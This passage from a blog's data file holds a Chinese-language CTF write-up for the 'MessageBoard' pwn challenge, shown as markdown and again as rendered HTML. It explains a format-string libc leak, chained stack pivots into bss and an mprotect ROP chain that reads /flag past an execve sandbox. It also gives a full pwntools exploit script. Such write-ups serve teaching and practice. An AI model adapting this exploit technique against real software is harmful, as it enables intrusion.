lea     rax, [rbp+var_B0] var_B0=-0xb0\n.text:000000000040137F BA C0 00 00 00                mov     edx, 0C0h                       ; nbytes\n.text:0000000000401384 48 89 C6                      mov     rsi, rax                        ; buf\n.text:0000000000401387 BF 00 00 00 00                mov     edi, 0                          ; fd\n.text:000000000040138C E8 8F FD FF FF                call    _read\n```\n\n这里是主程序中调用read函数的片段，在这里对寄存器进行设置并调用read。可以看到rsi是通过`mov rsi, rax`来赋值的，而rax是通过`lea rax, [rbp+0xb0] %算出rbp-0xb0后赋值给rax `来赋值。而栈迁移的时候我们会将rbp设置在bss段上，因此如果我们将返回地址覆盖为`0x401378`那么就会执行`read(0,bss_addr-0xb0,0xc0)`，通过这次读入我们可以将ROP链写到bss段中。\n\n读取ROP链后，rbp指向`bss_addr`，在read完成后的`leave;ret`会将栈迁移到`bss_addr`，并且执行`bss_addr+0x8`处的指令。然而这个位置已经是read读入内容的末尾了，因此需要再次通过栈迁移将栈迁移到read读入内容的开头。这需要让`bss_addr`处的内容为`bss_addr-xxx(读入内容开头的ROP链的位置-0x8)`，使`bss_addr+0x8`处的内容为`leave;ret`。这次会将栈迁移到ROP链处并执行。\n\nROP链走`mprotect->read->shellcraft.cat('/flag')`来cat flag，当然也可以走`orw`。\n\nexp如下:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\n# libc=ELF('./2.31-0ubuntu9.7_amd64/libc.so.6')\nlibc=ELF('./libc.so.6') # remote\np=process('./'+filename)\n# p=remote('tcp.cloud.dasctf.com',24407)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\n\nru(\"Welcome to DASCTF message board, please leave your name:\\n\")\npayload='%24$p'\n\n# debug()\nsl(payload)\n\nru('Hello, ')\nlibcbase=int(ru('\\n')[2:],16)-0x1f12e8\nleak('libcbase',hex(libcbase))\n# debug()\n\n\nleave=0x4013A2\nret_addr = libcbase + 0x0000000000022679 \npop_rdi=libcbase+0x0000000000023b6a\npop_rsi=libcbase+0x000000000002601f \npop_rdx=libcbase+0x0000000000142c92 \nread_addr = libcbase + libc.sym['read']\nmprotect_addr = libcbase + libc.sym['mprotect']\nbss_addr=0x404300\nvuln=0x0000000000401378\n\npayload=b'a'*176+p64(bss_addr)+p64(vuln)\ndebug()\ns(payload)\n\n# debug()\npayload=b'a'*0x10\npayload+=p64(ret_addr) \npayload+=p64(pop_rdi) + p64(0x404000)\npayload+=p64(pop_rsi) + p64(0x1000)\npayload+=p64(pop_rdx) + p64(7)\npayload+=p64(mprotect_addr)\n\npayload+=p64(pop_rdi) + p64(0)\npayload+=p64(pop_rsi) + p64(0x404500)\npayload+=p64(pop_rdx) + p64(0x100)\npayload+=p64(read_addr)\npayload+=p64(0x404500)\npayload=payload.ljust(0xb0,b'\\x00')\npayload+=p64(bss_addr-0xb0+0x10)+p64(leave)\ns(payload)\n\n\npayload = asm(shellcraft.cat(\"/flag\"))\ns(payload)\nleak('libcbase',hex(libcbase))\n# sleep(0.1)\nitr()\n```\n\n\n\n","source":"_posts/XHLJ-MessageBoard.md","raw":"---\ntitle: XHLJ_MessageBoard\ndate: 2023-03-01 09:17:56\ntags:\n- ROP\n- 栈迁移\n- orw\n- sandbox\ncategories:\n- pwn_wp\n---\n\n一道栈的题目，开了沙箱，需要通过栈溢出利用代码片段进行连续的栈迁移来写入ROP链并跳转执行ROP链。\n\n<!--more-->\n\n保护只开了NX。\n\n```sh\n[*] '/home/alphonse/CTF_GAME/XHLJ/MessageBoard/pwn'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n看看沙箱，禁用了`execve()`\n\n```sh\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005\n 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007\n 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007\n 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0007: 0x06 0x00 0x00 0x00000000  return KILL\n```\n\n程序的漏洞点比较明显，有一个格式化字符串和一个0x10byte的栈溢出\n\n```c\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  char *v3; // rax\n  char buf[8]; // [rsp+0h] [rbp-C0h] BYREF\n  char dest[8]; // [rsp+8h] [rbp-B8h] BYREF\n  char v7[176]; // [rsp+10h] [rbp-B0h] BYREF\n\n  init();\n  if ( !welcome_count )\n  {\n    strcpy(dest, \"Hello, \");\n    puts(\"Welcome to DASCTF message board, please leave your name:\");\n    read(0, buf, 8uLL);\n    welcome_count = 1;\n  }\n  v3 = strcat(dest, buf);\n  printf(v3);                                   // 格式化字符串\n  puts(\"Now, please say something to DASCTF:\");\n  read(0, v7, 192uLL);                          // 溢出0x10byte\n  puts(\"Posted Successfully~\");\n  return 0LL;\n}\n```\n\n格式化字符串漏洞可以用于leak libcbase或者栈地址。但我们只能输入8byte，因此如果偏移大于10的话，我们只能泄露出一个地址。经过调试可以发现libc地址在**偏移为24**的位置，因此只能泄露栈地址或者libc地址。\n\n如果只泄露栈地址的话，栈迁移回到缓冲区开头处后，由于不知道libcbase，因此利用不了libc中的函数，并且由于NX保护开启，无法ret2shellcode。所以只能选择泄露libc地址，**栈迁移到bss段后走ROP链**。\n\n但接下来就会遇到一个问题，在输入了一次之后程序就结束了，程序中没有直接将ROP链写入bss段，但我们可以**利用主程序中read的代码片段**进行写入，read的代码片段如下：\n\n```asm\n.text:0000000000401378 48 8D 85 50 FF FF FF          lea     rax, [rbp+var_B0] var_B0=-0xb0\n.text:000000000040137F BA C0 00 00 00                mov     edx, 0C0h                       ; nbytes\n.text:0000000000401384 48 89 C6                      mov     rsi, rax                        ; buf\n.text:0000000000401387 BF 00 00 00 00                mov     edi, 0                          ; fd\n.text:000000000040138C E8 8F FD FF FF                call    _read\n```\n\n这里是主程序中调用read函数的片段，在这里对寄存器进行设置并调用read。可以看到rsi是通过`mov rsi, rax`来赋值的，而rax是通过`lea rax, [rbp+0xb0] %算出rbp-0xb0后赋值给rax `来赋值。而栈迁移的时候我们会将rbp设置在bss段上，因此如果我们将返回地址覆盖为`0x401378`那么就会执行`read(0,bss_addr-0xb0,0xc0)`，通过这次读入我们可以将ROP链写到bss段中。\n\n读取ROP链后，rbp指向`bss_addr`，在read完成后的`leave;ret`会将栈迁移到`bss_addr`，并且执行`bss_addr+0x8`处的指令。然而这个位置已经是read读入内容的末尾了，因此需要再次通过栈迁移将栈迁移到read读入内容的开头。这需要让`bss_addr`处的内容为`bss_addr-xxx(读入内容开头的ROP链的位置-0x8)`，使`bss_addr+0x8`处的内容为`leave;ret`。这次会将栈迁移到ROP链处并执行。\n\nROP链走`mprotect->read->shellcraft.cat('/flag')`来cat flag，当然也可以走`orw`。\n\nexp如下:\n\n```python\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\n# libc=ELF('./2.31-0ubuntu9.7_amd64/libc.so.6')\nlibc=ELF('./libc.so.6') # remote\np=process('./'+filename)\n# p=remote('tcp.cloud.dasctf.com',24407)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n\n\nru(\"Welcome to DASCTF message board, please leave your name:\\n\")\npayload='%24$p'\n\n# debug()\nsl(payload)\n\nru('Hello, ')\nlibcbase=int(ru('\\n')[2:],16)-0x1f12e8\nleak('libcbase',hex(libcbase))\n# debug()\n\n\nleave=0x4013A2\nret_addr = libcbase + 0x0000000000022679 \npop_rdi=libcbase+0x0000000000023b6a\npop_rsi=libcbase+0x000000000002601f \npop_rdx=libcbase+0x0000000000142c92 \nread_addr = libcbase + libc.sym['read']\nmprotect_addr = libcbase + libc.sym['mprotect']\nbss_addr=0x404300\nvuln=0x0000000000401378\n\npayload=b'a'*176+p64(bss_addr)+p64(vuln)\ndebug()\ns(payload)\n\n# debug()\npayload=b'a'*0x10\npayload+=p64(ret_addr) \npayload+=p64(pop_rdi) + p64(0x404000)\npayload+=p64(pop_rsi) + p64(0x1000)\npayload+=p64(pop_rdx) + p64(7)\npayload+=p64(mprotect_addr)\n\npayload+=p64(pop_rdi) + p64(0)\npayload+=p64(pop_rsi) + p64(0x404500)\npayload+=p64(pop_rdx) + p64(0x100)\npayload+=p64(read_addr)\npayload+=p64(0x404500)\npayload=payload.ljust(0xb0,b'\\x00')\npayload+=p64(bss_addr-0xb0+0x10)+p64(leave)\ns(payload)\n\n\npayload = asm(shellcraft.cat(\"/flag\"))\ns(payload)\nleak('libcbase',hex(libcbase))\n# sleep(0.1)\nitr()\n```\n\n\n\n","slug":"XHLJ-MessageBoard","published":1,"updated":"2023-03-08T11:26:32.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafm00285oudewlohef8","content":"<p>一道栈的题目，开了沙箱，需要通过栈溢出利用代码片段进行连续的栈迁移来写入ROP链并跳转执行ROP链。</p>\n<span id=\"more\"></span>\n\n<p>保护只开了NX。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/alphonse/CTF_GAME/XHLJ/MessageBoard/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n\n<p>看看沙箱，禁用了<code>execve()</code></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class=\"built_in\">arch</span></span><br><span class=\"line\"> 0001: 0x15 0x00 0x05 0xc000003e  <span class=\"keyword\">if</span> (A != ARCH_X86_64) goto 0007</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0003: 0x35 0x00 0x01 0x40000000  <span class=\"keyword\">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class=\"line\"> 0004: 0x15 0x00 0x02 0xffffffff  <span class=\"keyword\">if</span> (A != 0xffffffff) goto 0007</span><br><span class=\"line\"> 0005: 0x15 0x01 0x00 0x0000003b  <span class=\"keyword\">if</span> (A == execve) goto 0007</span><br><span class=\"line\"> 0006: 0x06 0x00 0x00 0x7fff0000  <span class=\"built_in\">return</span> ALLOW</span><br><span class=\"line\"> 0007: 0x06 0x00 0x00 0x00000000  <span class=\"built_in\">return</span> KILL</span><br></pre></td></tr></table></figure>\n\n<p>程序的漏洞点比较明显，有一个格式化字符串和一个0x10byte的栈溢出</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(__int64 a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> *v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+0h] [rbp-C0h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> dest[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+8h] [rbp-B8h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v7[<span class=\"number\">176</span>]; <span class=\"comment\">// [rsp+10h] [rbp-B0h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  init();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !welcome_count )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(dest, <span class=\"string\">&quot;Hello, &quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Welcome to DASCTF message board, please leave your name:&quot;</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, buf, <span class=\"number\">8uLL</span>);</span><br><span class=\"line\">    welcome_count = <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v3 = <span class=\"built_in\">strcat</span>(dest, buf);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(v3);                                   <span class=\"comment\">// 格式化字符串</span></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Now, please say something to DASCTF:&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, v7, <span class=\"number\">192uLL</span>);                          <span class=\"comment\">// 溢出0x10byte</span></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Posted Successfully~&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>格式化字符串漏洞可以用于leak libcbase或者栈地址。但我们只能输入8byte，因此如果偏移大于10的话，我们只能泄露出一个地址。经过调试可以发现libc地址在<strong>偏移为24</strong>的位置，因此只能泄露栈地址或者libc地址。</p>\n<p>如果只泄露栈地址的话，栈迁移回到缓冲区开头处后，由于不知道libcbase，因此利用不了libc中的函数，并且由于NX保护开启，无法ret2shellcode。所以只能选择泄露libc地址，<strong>栈迁移到bss段后走ROP链</strong>。</p>\n<p>但接下来就会遇到一个问题，在输入了一次之后程序就结束了，程序中没有直接将ROP链写入bss段，但我们可以<strong>利用主程序中read的代码片段</strong>进行写入，read的代码片段如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000401378 48 8D 85 50 FF FF FF          lea     rax, [rbp+var_B0] var_B0=-0xb0</span><br><span class=\"line\">.text:000000000040137F BA C0 00 00 00                mov     edx, 0C0h                       ; nbytes</span><br><span class=\"line\">.text:0000000000401384 48 89 C6                      mov     rsi, rax                        ; buf</span><br><span class=\"line\">.text:0000000000401387 BF 00 00 00 00                mov     edi, 0                          ; fd</span><br><span class=\"line\">.text:000000000040138C E8 8F FD FF FF                call    _read</span><br></pre></td></tr></table></figure>\n\n<p>这里是主程序中调用read函数的片段，在这里对寄存器进行设置并调用read。可以看到rsi是通过<code>mov rsi, rax</code>来赋值的，而rax是通过<code>lea rax, [rbp+0xb0] %算出rbp-0xb0后赋值给rax </code>来赋值。而栈迁移的时候我们会将rbp设置在bss段上，因此如果我们将返回地址覆盖为<code>0x401378</code>那么就会执行<code>read(0,bss_addr-0xb0,0xc0)</code>，通过这次读入我们可以将ROP链写到bss段中。</p>\n<p>读取ROP链后，rbp指向<code>bss_addr</code>，在read完成后的<code>leave;ret</code>会将栈迁移到<code>bss_addr</code>，并且执行<code>bss_addr+0x8</code>处的指令。然而这个位置已经是read读入内容的末尾了，因此需要再次通过栈迁移将栈迁移到read读入内容的开头。这需要让<code>bss_addr</code>处的内容为<code>bss_addr-xxx(读入内容开头的ROP链的位置-0x8)</code>，使<code>bss_addr+0x8</code>处的内容为<code>leave;ret</code>。这次会将栈迁移到ROP链处并执行。</p>\n<p>ROP链走<code>mprotect-&gt;read-&gt;shellcraft.cat(&#39;/flag&#39;)</code>来cat flag，当然也可以走<code>orw</code>。</p>\n<p>exp如下:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># libc=ELF(&#x27;./2.31-0ubuntu9.7_amd64/libc.so.6&#x27;)</span></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>) <span class=\"comment\"># remote</span></span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># p=remote(&#x27;tcp.cloud.dasctf.com&#x27;,24407)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Welcome to DASCTF message board, please leave your name:\\n&quot;</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;%24$p&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&#x27;Hello, &#x27;</span>)</span><br><span class=\"line\">libcbase=<span class=\"built_in\">int</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[<span class=\"number\">2</span>:],<span class=\"number\">16</span>)-<span class=\"number\">0x1f12e8</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">leave=<span class=\"number\">0x4013A2</span></span><br><span class=\"line\">ret_addr = libcbase + <span class=\"number\">0x0000000000022679</span> </span><br><span class=\"line\">pop_rdi=libcbase+<span class=\"number\">0x0000000000023b6a</span></span><br><span class=\"line\">pop_rsi=libcbase+<span class=\"number\">0x000000000002601f</span> </span><br><span class=\"line\">pop_rdx=libcbase+<span class=\"number\">0x0000000000142c92</span> </span><br><span class=\"line\">read_addr = libcbase + libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">mprotect_addr = libcbase + libc.sym[<span class=\"string\">&#x27;mprotect&#x27;</span>]</span><br><span class=\"line\">bss_addr=<span class=\"number\">0x404300</span></span><br><span class=\"line\">vuln=<span class=\"number\">0x0000000000401378</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">176</span>+p64(bss_addr)+p64(vuln)</span><br><span class=\"line\">debug()</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span></span><br><span class=\"line\">payload+=p64(ret_addr) </span><br><span class=\"line\">payload+=p64(pop_rdi) + p64(<span class=\"number\">0x404000</span>)</span><br><span class=\"line\">payload+=p64(pop_rsi) + p64(<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">payload+=p64(pop_rdx) + p64(<span class=\"number\">7</span>)</span><br><span class=\"line\">payload+=p64(mprotect_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">payload+=p64(pop_rdi) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload+=p64(pop_rsi) + p64(<span class=\"number\">0x404500</span>)</span><br><span class=\"line\">payload+=p64(pop_rdx) + p64(<span class=\"number\">0x100</span>)</span><br><span class=\"line\">payload+=p64(read_addr)</span><br><span class=\"line\">payload+=p64(<span class=\"number\">0x404500</span>)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0xb0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">payload+=p64(bss_addr-<span class=\"number\">0xb0</span>+<span class=\"number\">0x10</span>)+p64(leave)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = asm(shellcraft.cat(<span class=\"string\">&quot;/flag&quot;</span>))</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"comment\"># sleep(0.1)</span></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"<p>一道栈的题目，开了沙箱，需要通过栈溢出利用代码片段进行连续的栈迁移来写入ROP链并跳转执行ROP链。</p>","more":"<p>保护只开了NX。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/alphonse/CTF_GAME/XHLJ/MessageBoard/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n\n<p>看看沙箱，禁用了<code>execve()</code></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class=\"built_in\">arch</span></span><br><span class=\"line\"> 0001: 0x15 0x00 0x05 0xc000003e  <span class=\"keyword\">if</span> (A != ARCH_X86_64) goto 0007</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0003: 0x35 0x00 0x01 0x40000000  <span class=\"keyword\">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class=\"line\"> 0004: 0x15 0x00 0x02 0xffffffff  <span class=\"keyword\">if</span> (A != 0xffffffff) goto 0007</span><br><span class=\"line\"> 0005: 0x15 0x01 0x00 0x0000003b  <span class=\"keyword\">if</span> (A == execve) goto 0007</span><br><span class=\"line\"> 0006: 0x06 0x00 0x00 0x7fff0000  <span class=\"built_in\">return</span> ALLOW</span><br><span class=\"line\"> 0007: 0x06 0x00 0x00 0x00000000  <span class=\"built_in\">return</span> KILL</span><br></pre></td></tr></table></figure>\n\n<p>程序的漏洞点比较明显，有一个格式化字符串和一个0x10byte的栈溢出</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(__int64 a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> *v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span 